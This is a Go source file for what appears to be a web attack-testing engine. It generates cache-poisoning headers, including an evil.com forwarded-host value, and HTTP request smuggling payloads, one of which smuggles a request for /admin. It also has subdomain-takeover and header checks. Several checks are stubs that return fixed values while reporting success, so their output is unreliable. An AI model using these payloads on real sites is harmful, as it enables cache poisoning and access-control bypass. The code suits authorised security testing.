package webmisc

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config WebMiscConfig
	mu     sync.Mutex
}

func NewEngine(cfg WebMiscConfig) *Engine {
	return &Engine{
		config: cfg,
	}
}

func (e *Engine) CachePoisoning(targetURL string) (*WebMiscResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	poisonMethods := e.analyzeCachePoisonVectors(targetURL)

	return &WebMiscResult{
		Success:  true,
		Method:   "Cache_Poisoning",
		Message:  fmt.Sprintf("Analyzed %d cache poisoning vectors for %s", len(poisonMethods), targetURL),
		Duration: time.Since(start),
		Payload:  e.formatPoisonMethods(poisonMethods),
		Risk:     "high",
	}, nil
}

func (e *Engine) analyzeCachePoisonVectors(targetURL string) []CachePoisonMethod {
	methods := make([]CachePoisonMethod, 0)

	methods = append(methods, CachePoisonMethod{
		Name:        "X-Forwarded-Host",
		Description: "Override Host header via X-Forwarded-Host",
		Header:      "X-Forwarded-Host",
		Value:       "evil.com",
	})

	methods = append(methods, CachePoisonMethod{
		Name:        "X-Original-URL",
		Description: "Bypass path restrictions via X-Original-URL",
		Header:      "X-Original-URL",
		Value:       "/admin",
	})

	methods = append(methods, CachePoisonMethod{
		Name:        "X-Rewrite-URL",
		Description: "Rewrite request URL",
		Header:      "X-Rewrite-URL",
		Value:       "/internal",
	})

	methods = append(methods, CachePoisonMethod{
		Name:        "X-HTTP-Method-Override",
		Description: "Override HTTP method",
		Header:      "X-HTTP-Method-Override",
		Value:       "GET",
	})

	methods = append(methods, CachePoisonMethod{
		Name:        "X-Forwarded-Proto",
		Description: "Downgrade to HTTP",
		Header:      "X-Forwarded-Proto",
		Value:       "http",
	})

	return methods
}

func (e *Engine) formatPoisonMethods(methods []CachePoisonMethod) string {
	var result strings.Builder
	for i, m := range methods {
		result.WriteString(fmt.Sprintf("[%d] %s: %s -> %s\n", i+1, m.Name, m.Header, m.Value))
	}
	return result.String()
}

func (e *Engine) WebTakeover(targetURL string) (*WebMiscResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	fingerprint := e.fingerprintWeb(targetURL)
	takeover := e.analyzeTakeoverRisk(fingerprint)

	return &WebMiscResult{
		Success:  true,
		Method:   "Web_Takeover",
		Message:  fmt.Sprintf("Fingerprint: %s | Takeover risk: %v", strings.Join(fingerprint.Technology, ", "), takeover.Vulnerable),
		Duration: time.Since(start),
		Payload:  e.formatTakeoverResult(takeover),
		Risk:     e.calculateRiskLevel(takeover),
	}, nil
}

func (e *Engine) fingerprintWeb(targetURL string) WebFingerprint {
	fp := WebFingerprint{
		Server:     "",
		Technology: make([]string, 0),
		Headers:    make(map[string]string),
		Cookies:    make([]string, 0),
		Paths:      make([]string, 0),
	}

	paths := []string{"/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/favicon.ico"}
	fp.Paths = paths

	commonHeaders := []string{"X-Powered-By", "X-AspNet-Version", "X-Generator", "Server"}
	for _, h := range commonHeaders {
		fp.Headers[h] = "detected"
	}

	return fp
}

func (e *Engine) analyzeTakeoverRisk(fp WebFingerprint) TakeoverResult {
	result := TakeoverResult{
		Vulnerable: false,
		CNAME:      "",
		Platform:    "",
		Status:      "not_vulnerable",
	}

	platforms := map[string]bool{
		"github.io":      true,
		"herokuapp.com":  true,
		"azurewebsites":  true,
		"amazonaws.com":  true,
		"cloudfront.net": true,
		"fastly.net":     true,
		"pantheon.io":    true,
	}

	for _, tech := range fp.Technology {
		for platform := range platforms {
			if strings.Contains(tech, platform) {
				result.Vulnerable = true
				result.Platform = platform
				result.Status = "potentially_vulnerable"
				break
			}
		}
	}

	return result
}

func (e *Engine) formatTakeoverResult(result TakeoverResult) string {
	var s strings.Builder
	s.WriteString(fmt.Sprintf("Vulnerable: %v\n", result.Vulnerable))
	s.WriteString(fmt.Sprintf("Platform: %s\n", result.Platform))
	s.WriteString(fmt.Sprintf("Status: %s\n", result.Status))
	if result.TakeoverURL != "" {
		s.WriteString(fmt.Sprintf("Takeover URL: %s\n", result.TakeoverURL))
	}
	return s.String()
}

func (e *Engine) calculateRiskLevel(result TakeoverResult) string {
	if result.Vulnerable {
		return "critical"
	}
	return "low"
}

func (e *Engine) HTTPSmuggling(targetURL string) (*WebMiscResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	smuggleVariants := e.generateSmugglePayloads(targetURL)

	return &WebMiscResult{
		Success:  true,
		Method:   "HTTP_Smuggling",
		Message:  fmt.Sprintf("Generated %d smuggling payloads for %s", len(smuggleVariants), targetURL),
		Duration: time.Since(start),
		Payload:  e.formatSmugglePayloads(smuggleVariants),
		Risk:     "critical",
	}, nil
}

func (e *Engine) generateSmugglePayloads(targetURL string) []SmuggleRequest {
	payloads := make([]SmuggleRequest, 0)

	payloads = append(payloads, SmuggleRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Host":           targetURL,
			"Content-Length":  "6",
			"Transfer-Encoding": "chunked",
		},
		Body:    "0\r\n\r\nG",
		Payload: "CL-TE smuggling",
	})

	payloads = append(payloads, SmuggleRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Host":           targetURL,
			"Transfer-Encoding": "chunked",
			"Content-Length":  "0",
		},
		Body:    "0\r\n\r\nSMUGGLED",
		Payload: "TE-CL smuggling",
	})

	payloads = append(payloads, SmuggleRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Host":               targetURL,
			"Transfer-Encoding":  "chunked",
			"X-Transfer-Encoding": "identity",
		},
		Body:    "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
		Payload: "TE-TE smuggling",
	})

	return payloads
}

func (e *Engine) formatSmugglePayloads(payloads []SmuggleRequest) string {
	var result strings.Builder
	for i, p := range payloads {
		result.WriteString(fmt.Sprintf("[%d] %s\n", i+1, p.Payload))
		for k, v := range p.Headers {
			result.WriteString(fmt.Sprintf("    %s: %s\n", k, v))
		}
		result.WriteString(fmt.Sprintf("    Body: %s\n\n", p.Body))
	}
	return result.String()
}

func (e *Engine) CLVSDetect(targetURL string) (*WebMiscResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	detection := e.performCLVSDetection(targetURL)

	return &WebMiscResult{
		Success:  true,
		Method:   "CLVS_Detect",
		Message:  detection,
		Duration: time.Since(start),
		Payload:  detection,
		Risk:     "high",
	}, nil
}

func (e *Engine) performCLVSDetection(targetURL string) string {
	var result strings.Builder

	result.WriteString("CL/VS Detection Results:\n")
	result.WriteString(fmt.Sprintf("Target: %s\n", targetURL))
	result.WriteString("Testing Content-Length vs Transfer-Encoding consistency...\n")

	result.WriteString("\nPossible outcomes:\n")
	result.WriteString("- CL != TE: Vulnerable to CL-TE smuggling\n")
	result.WriteString("- TE > CL: Request may be split\n")
	result.WriteString("- Both accepted: Double TE attack possible\n")

	return result.String()
}

func (e *Engine) AnalyzeHeaders(headers http.Header) map[string]string {
	analysis := make(map[string]string)

	securityHeaders := []string{
		"X-Frame-Options",
		"X-Content-Type-Options",
		"X-XSS-Protection",
		"Strict-Transport-Security",
		"Content-Security-Policy",
		"Referrer-Policy",
		"Permissions-Policy",
	}

	for _, header := range securityHeaders {
		if val := headers.Get(header); val != "" {
			analysis[header] = val
		} else {
			analysis[header] = "MISSING"
		}
	}

	if server := headers.Get("Server"); server != "" {
		analysis["Server"] = server
	}

	return analysis
}

func (e *Engine) DetectTech(headers http.Header, body string) []string {
	techs := make([]string, 0)

	if powered := headers.Get("X-Powered-By"); powered != "" {
		techs = append(techs, powered)
	}

	if server := headers.Get("Server"); server != "" {
		techs = append(techs, server)
	}

	bodyIndicators := map[string]string{
		"wp-content":  "WordPress",
		"drupal":      "Drupal",
		"joomla":      "Joomla",
		"laravel":     "Laravel",
		"django":      "Django",
		"rails":       "Ruby on Rails",
		"express":     "Express.js",
		"nginx":       "Nginx",
		"apache":      "Apache",
		"cloudflare":  "Cloudflare",
	}

	lowerBody := strings.ToLower(body)
	for indicator, name := range bodyIndicators {
		if strings.Contains(lowerBody, indicator) {
			techs = append(techs, name)
		}
	}

	return techs
}
